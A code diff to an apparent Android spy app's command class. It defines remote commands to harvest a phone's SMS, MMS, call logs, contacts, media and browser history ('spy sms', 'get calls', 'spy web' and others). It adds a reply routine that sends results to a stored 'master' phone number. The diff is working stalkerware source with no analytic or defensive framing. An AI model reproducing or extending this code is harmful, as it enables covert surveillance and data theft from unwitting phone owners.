@@ -4,6 +4,7 @@ import java.text.ParseException;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
+import java.util.Random;
 
 import com.code4bones.utils.Mail;
 import com.code4bones.utils.NetLog;
@@ -20,19 +21,22 @@ public class CommandObj extends Object implements ICommandObj {
 
 	
 	public static final String CMD_GPS = "gps";
-	public static final String CMD_HELP = "?";
+	public static final String CMD_HELP = "help";
+	public static final String CMD_WHAT = "?";
 	
 	public static final String CMD_GET_MEDIA = "get media";
 	public static final String CMD_SPY_MEDIA = "spy media";
 	
 	public static final String CMD_SPY_SMS = "spy sms";
+	public static final String CMD_ADD_SMS = "add sms";
 	public static final String CMD_GET_SMS = "get sms";
-	public static final String CMD_SPY_MMS = "spy mms";
 	public static final String CMD_GET_MMS = "get mms";
+	public static final String CMD_SPY_MMS = "spy mms";
 	
 	
 	public static final String CMD_SPY_BOOK = "spy book";
 	public static final String CMD_GET_BOOK = "get book";
+	public static final String CMD_ADD_BOOK = "add book";
 	
 	public static final String CMD_SPY_CALLS = "spy calls";
 	public static final String CMD_GET_CALLS = "get calls";
@@ -42,9 +46,10 @@ public class CommandObj extends Object implements ICommandObj {
 	public static final String CMD_SMS = "sms";
 	public static final String CMD_EVENT = "event";
 	
-	public static final String CMD_GET_HISTORY = "get browser";
-	public static final String CMD_SPY_HISTORY = "spy browser";
+	public static final String CMD_GET_WEB = "get web";
+	public static final String CMD_SPY_WEB = "spy web";
 	
+	public static final String CMD_KEEPALIVE = "keepalive";
 	
 	
 	
@@ -105,11 +110,11 @@ public class CommandObj extends Object implements ICommandObj {
 		return this;
 	}
 	
-	public void makeDateParam(String dateFileld) throws ParseException {
+	public void makeDateParam(String dateFileld,boolean dev) throws ParseException {
 		if ( mArgs.hasArg("from") && mArgs.hasArg("to"))
-			mDateParam = CommandObj.getDateClause("date",mArgs.dateValue("from"),mArgs.dateValue("to"));
+			mDateParam = CommandObj.getDateClause("date",mArgs.dateValue("from"),mArgs.dateValue("to"),dev);
 		else if ( mArgs.hasArg("date") )
-			mDateParam = CommandObj.getDateClause("date",mArgs.dateValue("date"),mArgs.dateValue("date"));
+			mDateParam = CommandObj.getDateClause("date",mArgs.dateValue("date"),mArgs.dateValue("date"),dev);
 		else
 			mDateParam = null;
 	}
@@ -136,6 +141,17 @@ public class CommandObj extends Object implements ICommandObj {
 	}
 	
 	public void Reply(Object ... argv) throws Exception {
+		if ( this.mMasterPhone == null || this.mMasterPhone.length() == 0 ) {
+			SharedPreferences p = mContext.getSharedPreferences("prefs",1);
+			if ( p.contains(CommandObj.PREF_MASTER) )
+				this.mMasterPhone = p.getString(CommandObj.PREF_MASTER, "");
+			if ( this.mMasterPhone.length() == 0 ) {
+				NetLog.v("**** ERROR *** Framewrok not initialized");
+				return;
+			}
+		}
+		if ( mCommandResult == null )
+			mCommandResult = "Результат не инициализирован...";
 		this.replySMS(mCommandResult);
 	}
 
@@ -190,7 +206,6 @@ public class CommandObj extends Object implements ICommandObj {
 		ConnectivityManager connManager = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
 		NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
 		boolean connected = mWifi.isConnected();
-		NetLog.v("WIFI is %s",connected);
 		return connected;
 	}
 	
@@ -207,7 +222,7 @@ public class CommandObj extends Object implements ICommandObj {
 			m.send();
 	}
 	
-	public static String getDateClause(String dateField,long fromTime,long toTime) {
+	public static String getDateClause(String dateField,long fromTime,long toTime,boolean dev) {
 		Calendar toCal = Calendar.getInstance();
 		Calendar fromCal = Calendar.getInstance();
 		
@@ -226,15 +241,15 @@ public class CommandObj extends Object implements ICommandObj {
 		toCal.set(Calendar.MINUTE,59);
 		toCal.set(Calendar.SECOND,59);
 		
-		NetLog.v("from %s to %s\n",fromCal.getTime().toLocaleString(),toCal.getTime().toLocaleString());
+		NetLog.v("DATE from %s to %s\n",fromCal.getTime().toLocaleString(),toCal.getTime().toLocaleString());
 		
-		return String.format("%s >= %d AND %s <= %d ",dateField,fromCal.getTime().getTime(),
-													  dateField,toCal.getTime().getTime()); 
+		return String.format("%s * %d >= %d AND %s * %d <= %d ",dateField,dev?1000:1,fromCal.getTime().getTime(),
+													  dateField,dev?1000:1,toCal.getTime().getTime()); 
 	}
 
 	public static String getFile(Context ctx,String name) {
 		String dir = ctx.getApplicationInfo().dataDir;
-		return String.format("%s/%s",dir,name);
+		return String.format("%s/%s.%x",dir,name,new Date().getTime());
 	}
 	
 	
